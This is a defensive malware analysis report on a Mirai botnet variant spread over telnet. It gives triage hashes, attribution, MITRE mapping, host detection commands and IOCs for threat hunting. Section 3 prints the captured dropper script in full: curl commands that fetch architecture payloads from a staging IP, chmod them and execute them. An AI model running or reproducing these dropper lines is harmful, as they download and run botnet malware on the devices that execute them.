# MIRAI_TELNETCURL — Analysis Report

**Lead sample:** `3801a288c16a19c57c7a8a7b0f139cf630d2cd0c4bbcb26876e3593c492ffc5d`
**TLP:WHITE** · Author: AfterPacket · Analysed: 2026-08-08 · Samples: 7

---

## 1. Incident summary

A telnet-propagated Mirai variant active 2026-08-01 → 2026-08-07. Two dropper
scripts — a `curl` variant and a `busybox wget` variant of the same file — stage
five architecture payloads from `205.237.110.232`, each written to a fixed
non-dictionary filename and executed with the tag `telnet.curl`. Five ELF
payloads were captured directly from a second host, `60.185.49.73`.

The family is **genuinely IP-only**, and this review establishes that by
negative result rather than assumption: a full single-byte XOR keyspace sweep
across all five payloads returned nothing, including at `0x22` — the key that
does yield a hidden flood module in MIRAI_OHSHIT.

## 2. Phase 1 — Triage

| SHA-256 (8) | Role | Size | Type | VT |
|---|---|---|---|---|
| `3801a288` | `/curl.sh` dropper | 541 B | POSIX shell | none |
| `e1568cae` | `/wget.sh` dropper | 600 B | POSIX shell | **15/60** |
| `b6260a8c` | `/arm7` | 497344 B | ELF32 ARM | none |
| `9cbe35b1` | `/arm5` | 510624 B | ELF32 ARM | none |
| `a834705a` | `/arm` | 516512 B | ELF32 ARM | none |
| `3afa3a11` | `/mips` | 672772 B | ELF32 MIPS BE | none |
| `f6f9c5f1` | `/mipsel` | 681736 B | ELF32 MIPS LE | none |

Droppers delivered from `138.117.43.19`; ELF payloads dropped directly by
`60.185.49.73`. Both over telnet.

## 3. Phase 2 — Configuration block

`/curl.sh` in full (16 lines):

```sh
#!/bin/sh

rm -rf PLXMKJ
rm -rf WQZRTY
rm -rf YUIOXC
rm -rf GHJKLB
rm -rf MNCXOP
rm -rf KFGDFG
rm -rf VFASXC

curl http://205.237.110.232/arm    -o VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
curl http://205.237.110.232/arm5   -o WQZRTY; chmod 777 WQZRTY; ./WQZRTY telnet.curl
curl http://205.237.110.232/arm7   -o YUIOXC; chmod 777 YUIOXC; ./YUIOXC telnet.curl
curl http://205.237.110.232/mips   -o GHJKLB; chmod 777 GHJKLB; ./GHJKLB telnet.curl
curl http://205.237.110.232/mipsel -o MNCXOP; chmod 777 MNCXOP; ./MNCXOP telnet.curl
```

`/wget.sh` is byte-for-byte the same logic with `/bin/busybox wget ... -O`
substituted for `curl ... -o`.

### The seven-versus-five discrepancy

The cleanup preamble removes **seven** filenames; only **five** are fetched.
`PLXMKJ` and `KFGDFG` are never downloaded from `205.237.110.232`.

They are cleanup targets for architecture builds this kit ships but these two
hosts did not serve. **A host carrying `PLXMKJ` or `KFGDFG` was hit by a variant
of this dropper that has not been captured** — making them the most valuable
hunt strings in the family. Both are now in the YARA rule and IOC feed.

### Attribution link

The five filenames served by `205.237.110.232` match the five dropped directly
by `60.185.49.73` exactly. One kit, two hosts, one campaign.

## 4. Phase 3 — Capabilities

| Capability | Detail |
|-----------|--------|
| Multi-architecture | 5 targets: arm, arm5, arm7, mips, mipsel |
| Dual retrieval | `curl` and `busybox wget` variants for minimal-userland targets |
| Permissive chmod | `chmod 777`, not `chmod +x` — sloppy but effective |
| Exec tagging | `telnet.curl` passed to every payload — infection-vector tag |
| Anti-collision | `rm -rf` preamble clears prior infections/rivals |
| Telnet propagation | scanner range constants `119/120/121.0.0.0` in payloads |

### Obfuscation — explicitly absent

All five payloads were swept across keys `0x01`–`0xFF` on 2026-08-08, with
`0x22` specifically checked. **Zero meaningful strings recovered at any key.**

```
python3 tools/binstrings.py <payload>.bin --xor sweep
  key 0x77: 1 marker hits
  key 0x20: 1 marker hits  <- case-flip artefact, not obfuscation
```

Contrast MIRAI_OHSHIT, where the same command returns `key 0x22: 1025 marker
hits`. This family stores no obfuscated configuration.

## 5. Phase 4 — C2 protocol

Plain HTTP on port 80 to a bare IP: `http://205.237.110.232/<arch>`. No
User-Agent override — default `curl`/`busybox-wget` UA. **No domain appears in
the droppers at all**, so there is no namespace to sinkhole; handle at the route
layer.

The payloads contain exactly one domain,
`www.ikindalikemenbutonlyontuesday.com` — the decoy from the leaked Mirai
source, present in all five builds. It is a **lineage marker, not
infrastructure**: any Mirai descendant retaining the original resolver code
carries it. Treat a hit as "some Mirai descendant" and require corroborating
infrastructure before attributing to this campaign. Not blocklisted; blocking it
achieves nothing.

## 6. Phase 5 — Persistence

**None.** Droppers fetch, chmod, execute. Survival is by reinfection.

## 7. Phase 6 — Attribution

Mirai-derived, **HIGH confidence** — decoy domain, scanner range constants, and
the multi-arch drop pattern are all canonical. The fixed non-dictionary
filenames are this campaign's distinguishing feature and are not part of stock
Mirai; they are the strongest discriminator available.

Distinct from MIRAI_OHSHIT in this same capture: different staging host,
different filenames, different exec tag, no compiled-in C2 domains, and no XOR
obfuscation. The two payload YARA rules were written to be mutually exclusive
for that reason.

## 8. Phase 7 — Host detection

```bash
ls -la VFASXC WQZRTY YUIOXC GHJKLB MNCXOP PLXMKJ KFGDFG 2>/dev/null
grep -rl "205.237.110.232\|telnet.curl" /tmp /var/tmp /home /root 2>/dev/null
ps aux | grep -E "VFASXC|WQZRTY|YUIOXC|GHJKLB|MNCXOP|PLXMKJ|KFGDFG"
```

The seven filenames are non-dictionary six-character tokens — effectively
zero false-positive rate. `PLXMKJ` or `KFGDFG` indicates an uncaptured variant.

## 9. Phase 8 — MITRE ATT&CK

| ID | Technique | Implementation |
|----|-----------|----------------|
| T1078.001 | Valid Accounts: Default | telnet with default credentials |
| T1059.004 | Unix Shell | POSIX dropper |
| T1105 | Ingress Tool Transfer | curl / busybox wget retrieval |
| T1222.002 | Linux File Permission Modification | `chmod 777` |
| T1071.001 | Web Protocols | HTTP staging |
| T1498.001 | Direct Network Flood | Mirai flood capability |

## 10. IOC table

| Type | Value | Confidence |
|------|-------|-----------|
| IP | `205.237.110.232` | HIGH — hardcoded in both droppers |
| IP | `60.185.49.73` | HIGH — direct capture, dropped 5 ELF |
| IP | `138.117.43.19` | HIGH — direct capture, delivered both droppers |
| Port | 80 | — |
| String | `telnet.curl` | HIGH |
| Filename | `VFASXC`, `WQZRTY`, `YUIOXC`, `GHJKLB`, `MNCXOP` | HIGH — fetched |
| Filename | `PLXMKJ`, `KFGDFG` | HIGH — cleanup-only, uncaptured build |
| **Not blocked** | `www.ikindalikemenbutonlyontuesday.com` | lineage marker |
| **Not blocked** | `119.0.0.0`, `120.0.0.0`, `121.0.0.0` | scanner range constants |

**Artifacts:** `yara/MIRAI_TELNETCURL_dropper.yar`, `yara/MIRAI_TELNETCURL_payload.yar` ·
`suricata/mirai_telnetcurl.rules` (9002001–9002005) ·
`ioc/MIRAI_TELNETCURL_ioc.txt`
